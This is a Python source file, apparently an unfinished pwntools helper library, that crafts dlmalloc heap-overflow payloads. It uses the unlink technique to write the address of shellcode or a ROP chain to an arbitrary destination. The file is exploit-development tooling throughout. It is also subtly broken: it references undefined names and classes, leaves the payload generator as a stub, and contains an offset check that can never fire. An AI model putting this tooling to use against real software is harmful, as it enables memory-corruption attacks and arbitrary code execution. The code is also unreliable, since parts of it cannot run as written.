
from pwn import *

# TODO support for overwriting using forward consolidation
# TODO support for overwriting using forward consolidation only
# TODO support for overwriting using frontlink method

"""
Terminology :
    Block that is being overwritten and later freed     :    "C"
    Block that is 'before' C(our crafted block)         :    "BEFORE_C"
    Block that is 'after'  C                            :    "AFTER_C"
"""

class HeaplibException(Exception):
    pass

class HeapPayloadCrafter(object):
    def __init__(self, destination, source, **kw):
        """
        destination    :   Address to which `source` must be written out to.
        source         :   Address of your shellcode/ROP chain. Note that *(source+8)
                           must be writable
        destination_2  :   Optional 2nd address to overwrite using forward consolidation.
        """
        self.destination          = destination
        self.source               = source
        self.destination_2        = kw.get("destination_2", None)
        self.source_2             = kw.get("source_2", None)
        self.allocator            = kw.get("allocator", "dlmalloc")
        self.bytes_to_nextheader  = kw.get("bytes_to_nextheader", None)
        self.preset_content       = kw.get("preset_content", {})
        self.populating_character = kw.get("populating_character", "*")

    def can_use(self, content, start, length):
        return content[start: start+length] == [self.populating_character] * length

    def populate_content(self, **kw):
        # Facilitating testing
        rc = kw.get("preset_content", self.preset_content)
        bnh = kw.get("bytes_to_nextheader", self.bytes_to_nextheader)

        full_content = [self.populating_character] * bnh
        for offset in rc:
            content = rc[offset]
            start, end = offset, offset + len(content)

            if start < 0 and start >= bnh:
                raise HeaplibException("Invalid start offset when populating content")
            elif end >= bnh:
                raise HeaplibException("Invalid end offset when populating content")

            if not self.can_use(full_content, start, len(content)):
                raise HeaplibException("Offset (%d: %d) is already used" %(start, start+len(content)))
            full_content[start:end] = content

        return full_content

    def generate_payload(self, content):
        # We try to find positions for PREV_SIZE, SIZE of the block we
        # overwrite, PREV_SIZE, SIZE, FD, BD of the crafted block and
        # PREV_SIZE and SIZE for the block "after" "c"(the block whose
        # metadata is overwritten). We attempt to take advantage of
        # backward consolidation.

        PREV_SIZE_TO_OVERWRITE = 0

        # We start off with trying to find values for SIZE, so that
        # control moves to our `next` chunk when dlmalloc attempts to
        # do forward consolidation.
        for SIZE_TO_OVERWRITE in xrange(-8, self.bytes_to_nextheader, -4):
            # check if there is some content at that length
            if self.can_use(content, SIZE_TO_OVERWRITE, 8):
                # check if CAC can be placed somewhere before
                pass
        pass


    def get_exploit(self):
        """
        The exploit returned will be in 2 parts.
        - The first part will contain data upto the part that
        is intended to overwrite the header of the next chunk.
        - The second part is supposed to be the data part of the
        chunk who is about to be freed.

        Uses the 'unlink' method to craft 2 values :
        1. CraftedMetadata
            This should overwrite the metadata of the block
            being freed.
        2. CraftedBlock
            This should be places in memory right after the
            crafted memory i.e. as the data of the block
            being freed.
        """
        if self.allocator == "dlmalloc":
            if not bytes_to_nextheader:
                return str(CraftedMetadata()), str(CraftedBlock(self.source-12, self.destination))
            else:
                content = self.populate_content()
                payload = self.generate_payload(content)

        raise HeaplibException("Allocator not supported")

    def __str__(self):
        return ''.join(self.get_exploit())
